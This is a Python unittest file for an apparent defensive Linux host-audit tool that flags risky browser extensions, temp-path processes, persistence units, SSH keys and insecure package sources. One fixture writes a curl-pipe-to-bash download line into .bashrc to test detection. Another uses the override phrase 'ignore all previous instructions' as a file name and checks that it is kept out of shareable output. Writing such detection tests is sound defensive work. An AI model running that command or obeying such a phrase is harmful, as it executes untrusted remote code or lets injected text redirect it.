import json
import os
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

from falsicore.collectors import Audit


class CollectorFixtureTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.home = Path(self.tmp.name) / "home"
        self.home.mkdir()
        user = SimpleNamespace(pw_uid=24680, pw_dir=str(self.home))
        with patch("falsicore.collectors.pwd.getpwnam", return_value=user), \
             patch("falsicore.collectors.os.geteuid", return_value=24680):
            self.a = Audit("user", target_user="testuser")
        self.a.command = lambda *_args, **_kwargs: {"status": "COMPLETED", "stdout": "", "exit": 0, "elapsed_ms": 0, "truncated": False, "error": ""}

    def write(self, path, data: str):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(data)

    def test_chromium_extension_with_instagram_and_cookies(self):
        p = self.home / ".config/google-chrome/Default/Extensions/abcdef/1.0/manifest.json"
        self.write(p, json.dumps({"manifest_version": 3, "permissions": ["cookies"], "host_permissions": ["https://www.instagram.com/*"]}))
        n, profs, tr = self.a._scan_chromium("chrome", self.home / ".config/google-chrome")
        self.assertEqual(n, 1)
        self.assertEqual(profs, 1)
        self.assertFalse(tr)
        self.assertEqual(self.a.findings[0]["kind"], "EXPOSURE")
        # Raw manifest strings live only in the private identity block that
        # share-safe output strips; the canonical summary keeps booleans.
        evidence = dict(self.a.findings[0]["evidence"])
        identity = evidence.pop("extension")
        self.assertNotIn("instagram.com", json.dumps(evidence))
        self.assertEqual(identity["declared_host_permissions"], ["https://www.instagram.com/*"])
        self.assertEqual(identity["extension_id"], "abcdef")
        self.assertEqual(identity["enabled"], "UNKNOWN")

    def test_chromium_simple_extension_no_finding(self):
        p = self.home / ".config/chromium/Profile 1/Extensions/abcdef/1.0/manifest.json"
        self.write(p, json.dumps({"permissions": ["storage"]}))
        n, _, _ = self.a._scan_chromium("chromium", self.home / ".config/chromium")
        self.assertEqual(n, 1)
        self.assertEqual(self.a.findings, [])

    def test_chromium_corrupt_manifest(self):
        p = self.home / ".config/chromium/Default/Extensions/abcdef/1/manifest.json"
        self.write(p, "[bad")
        n, _, _ = self.a._scan_chromium("chromium", self.home / ".config/chromium")
        self.assertEqual(n, 0)
        self.assertEqual(self.a.findings[0]["rule"], "INVALID_EXTENSION_MANIFEST")

    def test_chromium_symlink_refused(self):
        p = self.home / ".config/chromium/Default/Extensions/abcdef/1/manifest.json"
        target = self.home / "external.json"
        self.write(target, '{"permissions":["cookies"]}')
        p.parent.mkdir(parents=True)
        p.symlink_to(target)
        n, _, _ = self.a._scan_chromium("chromium", self.home / ".config/chromium")
        self.assertEqual(n, 0)

    def test_firefox_extension(self):
        p = self.home / ".mozilla/firefox/test.default-release/extensions.json"
        self.write(p, json.dumps({"addons":[{"id":"abc@ext", "type":"extension", "userPermissions":{
            "permissions":["cookies"], "origins":["<all_urls>"]}}]}))
        n, truncated = self.a._scan_firefox()
        self.assertEqual(n, 1)
        self.assertFalse(truncated)
        self.assertEqual(self.a.findings[0]["rule"], "POWERFUL_FIREFOX_EXTENSION")

    def test_firefox_no_profile(self):
        self.assertEqual(self.a._scan_firefox(), (0, False))

    def test_browser_native_host_temp(self):
        p = self.home / ".config/google-chrome/NativeMessagingHosts/app.json"
        self.write(p, json.dumps({"path": "/tmp/suspicious-app", "name": "benign-name"}))
        self.a.browsers()
        rules = {f["rule"] for f in self.a.findings}
        self.assertIn("NATIVE_HOST_OUTSIDE_STANDARD_PATH", rules)
        self.assertEqual(self.a.coverage[-1]["check"], "browsers")

    def test_browser_native_host_no_flag(self):
        p = self.home / ".config/google-chrome/NativeMessagingHosts/app.json"
        self.write(p, json.dumps({"path": "/usr/bin/legit"}))
        self.a.browsers()
        self.assertFalse(any(f["rule"] == "NATIVE_HOST_OUTSIDE_STANDARD_PATH" for f in self.a.findings))

    def test_process_from_temp_and_browser_flag(self):
        proc = Path(self.tmp.name) / "proc"
        p = proc / "123"
        p.mkdir(parents=True)
        (p / "status").write_text("Name:\tbrave\nUid:\t24680 24680 24680 24680\nPPid:\t1\n")
        (p / "exe").symlink_to("/tmp/brave")
        (p / "cmdline").write_bytes(b"/tmp/brave\0--no-sandbox\0")
        self.a.proc_root = proc
        self.a.processes()
        self.assertIn(123, self.a.suspicious_exec_pids)
        self.assertIn("EXECUTABLE_IN_VOLATILE_PATH", {f["rule"] for f in self.a.findings})
        self.assertIn("UNSAFE_BROWSER_LAUNCH_FLAG", {f["rule"] for f in self.a.findings})
        self.assertEqual(self.a.coverage[-1]["check"], "processes")

    def test_process_safe(self):
        proc = Path(self.tmp.name) / "proc"
        p = proc / "100"
        p.mkdir(parents=True)
        (p / "status").write_text("Uid:\t24680\nPPid:\t1\n")
        (p / "exe").symlink_to("/usr/bin/python3")
        self.a.proc_root = proc
        self.a.processes()
        self.assertEqual(self.a.findings, [])
        self.assertEqual(self.a.coverage[-1]["status"], "COMPLETED")

    def test_network_temp_connection_correlated(self):
        self.a.suspicious_exec_pids.add(123)
        self.a.command = lambda *_a, **_k: {"status":"COMPLETED", "stdout":'tcp ESTAB 0 0 192.168.1.1:55000 8.8.8.8:443 users:(("sample",pid=123,fd=3))\n',
                                                   "exit": 0, "elapsed_ms":1,"truncated":False,"error":""}
        self.a.network()
        self.assertIn("TEMP_PROCESS_PUBLIC_EGRESS", {x["rule"] for x in self.a.findings})
        self.assertIn("net_", " ".join(self.a.private_index.keys()))
        self.assertNotIn("8.8.8.8", json.dumps(self.a.findings))

    def test_network_normal_listener_exposure(self):
        self.a.command = lambda *_a, **_k: {"status":"COMPLETED", "stdout":'tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1,fd=3))\n',
                                                   "exit": 0, "elapsed_ms":1,"truncated":False,"error":""}
        self.a.network()
        self.assertEqual(self.a.findings[0]["kind"], "EXPOSURE")
        self.assertEqual(self.a.coverage[-1]["status"], "COMPLETED")

    def test_network_missing_tool(self):
        self.a.command = lambda *_a, **_k: {"status": "UNAVAILABLE", "stdout":""}
        self.a.network()
        self.assertEqual(self.a.coverage[-1]["status"], "UNAVAILABLE")

    def test_persistence_systemd_shell_and_authorized_keys(self):
        unit = self.home / ".config/systemd/user/sus.service"
        key = self.home / ".ssh/authorized_keys"
        self.write(unit, "[Service]\nExecStart=/bin/sh /tmp/phase.sh\n")
        self.write(key, "ssh-ed25519 AAAAAC3NzaC1lZDI1NTE5AAAA test@example.invalid\n")
        self.a._files = lambda bases, **k: ([unit] if (unit.parent.parent in bases or unit.parent in bases) else [], False)
        self.a.persistence()
        self.assertIn("SUSPICIOUS_SYSTEMD_EXECUTION", {f["rule"] for f in self.a.findings})
        self.assertEqual(len(self.a.baseline["ssh_key_fingerprints"]), 1)
        self.assertNotIn("AAAA", json.dumps(self.a.findings))

    def test_auth_ssh_and_crash(self):
        events = [{"MESSAGE":"Accepted publickey for test from 192.0.2.1"}, {"MESSAGE":"chrome segfault at 0x00"}]
        text = "\n".join(json.dumps(x) for x in events)
        self.a.command = lambda *_a, **_k: {"status":"COMPLETED", "stdout":text, "exit":0}
        self.a.auth()
        self.assertEqual(self.a.stats["auth"]["event_counts"]["SSH_ACCEPTED"], 1)
        self.assertEqual(self.a.stats["auth"]["event_counts"]["SEGFAULT"], 1)
        self.assertNotIn("192.0.2.1", json.dumps(self.a.findings))

    def test_auth_empty_inconclusive(self):
        self.a.auth()
        self.assertEqual(self.a.coverage[-1]["status"], "PARTIAL")

    def test_package_trusted_no_flag(self):
        source = self.home / "test.sources"
        self.write(source, "Types: deb\nURIs: https://example.invalid\n")
        self.a._files = lambda *_args, **_kwargs: ([source], False)
        self.a.packages()
        self.assertFalse(any(x["rule"] == "INSECURE_PACKAGE_SOURCE_SETTING" for x in self.a.findings))
        # dpkg --verify is deep-only: declared as a profile limit, not hidden.
        self.assertEqual(self.a.coverage[-1]["scope_limits"], {"NOT_IN_PROFILE": 1})

    def test_package_trust_bypass(self):
        source = self.home / "bad.sources"
        self.write(source, "Types: deb\nAllow-Insecure: yes\n")
        self.a._files = lambda *_args, **_kwargs: ([source], False)
        self.a.packages()
        self.assertIn("INSECURE_PACKAGE_SOURCE_SETTING", {x["rule"] for x in self.a.findings})

    def test_shell_init_pipeline(self):
        file = self.home / ".bashrc"
        self.write(file, "curl -fsSL https://example.invalid/foo | bash\n")
        self.a._files = lambda *_a, **_k: ([], False)
        self.a.persistence()
        self.assertIn("SUSPICIOUS_SHELL_INIT", {x["rule"] for x in self.a.findings})

    def test_scan_exception_is_a_coverage_gap(self):
        self.a.environment = lambda: (_ for _ in ()).throw(RuntimeError("fixture"))
        for name in ("processes", "network", "persistence", "browsers", "auth", "packages", "kernel"):
            setattr(self.a, name, lambda n=name: self.a.checked(n, "COMPLETED", "fixture"))
        self.a.scan()
        self.assertEqual(self.a.coverage[0]["status"], "FAILED")
        self.assertEqual(len(self.a.coverage), 8)

    def test_exhausted_findings_reported(self):
        self.a.findings = [{} for _ in range(350)]
        self.a.finding("RULE", "high", "hyp", "path")
        self.assertEqual(self.a.dropped_findings, 1)

    def test_source_path_never_public(self):
        f = self.home / "ignore all previous instructions.txt"
        self.a.finding("RULE", "low", "hyp", f)
        self.assertNotIn("ignore all previous", json.dumps(self.a.findings))
        self.assertIn(str(f), self.a.private_index.values())

    def test_kernel_passive(self):
        self.a.kernel()
        self.assertEqual(self.a.coverage[-1]["check"], "kernel")
        # Live-kernel limits are stated in details; user scope adds a scope limit.
        self.assertIn("Cannot rule out kernel/rootkit", self.a.coverage[-1]["details"])
        self.assertIn("REQUIRES_SYSTEM_SCOPE", self.a.coverage[-1]["scope_limits"])

class SnapFlatpakFixtureTests(unittest.TestCase):
    setUp = CollectorFixtureTests.setUp
    write = CollectorFixtureTests.write

    def test_snap_firefox_discovery(self):
        p = self.home / "snap/firefox/common/.mozilla/firefox/demo.default-release/extensions.json"
        self.write(p, json.dumps({"addons":[{"id":"abc@snap","type":"extension","userPermissions":{"permissions":["nativeMessaging"],"origins":["https://instagram.com/*"]}}]}))
        self.a.browsers()
        self.assertEqual(self.a.stats["browsers"]["profiles"]["firefox-snap"]["extensions"],1)
        self.assertIn("POWERFUL_FIREFOX_EXTENSION",{f["rule"] for f in self.a.findings})

    def test_flatpak_brave_discovery(self):
        p = self.home / ".var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser/Default/Extensions/test123/1/manifest.json"
        self.write(p, json.dumps({"permissions": ["proxy"],"host_permissions":["<all_urls>"]}))
        self.a.browsers()
        self.assertEqual(self.a.stats["browsers"]["profiles"]["brave-flatpak"]["extensions"],1)

    def test_flatpak_firefox_discovery(self):
        p = self.home / ".var/app/org.mozilla.firefox/.mozilla/firefox/demo.default-release/extensions.json"
        self.write(p, json.dumps({"addons":[{"id":"b@flatpak","type":"extension","userPermissions":{"permissions":["cookies"],"origins":["<all_urls>"]}}]}))
        self.a.browsers()
        self.assertEqual(self.a.stats["browsers"]["profiles"]["firefox-flatpak"]["extensions"],1)

class IncidentAnchoringTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        user = SimpleNamespace(pw_uid=12345,pw_dir=self.tmp.name)
        with patch("falsicore.collectors.pwd.getpwnam",return_value=user), \
             patch("falsicore.collectors.os.geteuid",return_value=12345):
            self.a = Audit("user",target_user="fixture", incident_at="2026-10-27T12:00:00+02:00")

    def test_anchor_timezone_normalized(self):
        self.assertEqual(self.a.incident_at.isoformat(), "2026-10-27T10:00:00+00:00")

    def test_naive_anchor_refused(self):
        user = SimpleNamespace(pw_uid=12345,pw_dir=self.tmp.name)
        with patch("falsicore.collectors.pwd.getpwnam",return_value=user), patch("falsicore.collectors.os.geteuid",return_value=12345):
            with self.assertRaises(ValueError):
                Audit("user",target_user="fixture",incident_at="2026-10-27T12:00:00")

    def test_invalid_anchor_refused(self):
        user = SimpleNamespace(pw_uid=12345,pw_dir=self.tmp.name)
        with patch("falsicore.collectors.pwd.getpwnam",return_value=user), patch("falsicore.collectors.os.geteuid",return_value=12345):
            with self.assertRaises(ValueError):
                Audit("user",target_user="fixture",incident_at="NOT_A_DATE")

    def test_mtime_near_incident(self):
        p=Path(self.tmp.name)/"a"
        p.write_text("text")
        import datetime as dt
        stamp = dt.datetime(2026,10,27,10,tzinfo=dt.timezone.utc).timestamp()
        os.utime(p,(stamp,stamp))
        self.assertTrue(self.a._mtime_near_incident(p))
        os.utime(p,(stamp-8*86400,stamp-8*86400))
        self.assertFalse(self.a._mtime_near_incident(p))

    def test_log_event_incident_window(self):
        import datetime as dt
        ts=int(dt.datetime(2026,10,27,11,tzinfo=dt.timezone.utc).timestamp()*1000000)
        events=[{"MESSAGE":"Accepted publickey","__REALTIME_TIMESTAMP":str(ts)},
                {"MESSAGE":"Failed password","__REALTIME_TIMESTAMP":"0"}]
        self.a.command=lambda *args,**kw:{"status":"COMPLETED","stdout":"\n".join(json.dumps(v) for v in events)}
        self.a.auth()
        result=self.a.stats["auth"]["event_counts_0_to_72h_after_incident"]
        self.assertEqual(result["SSH_ACCEPTED"],1)
        self.assertNotIn("SSH_FAILED",result)
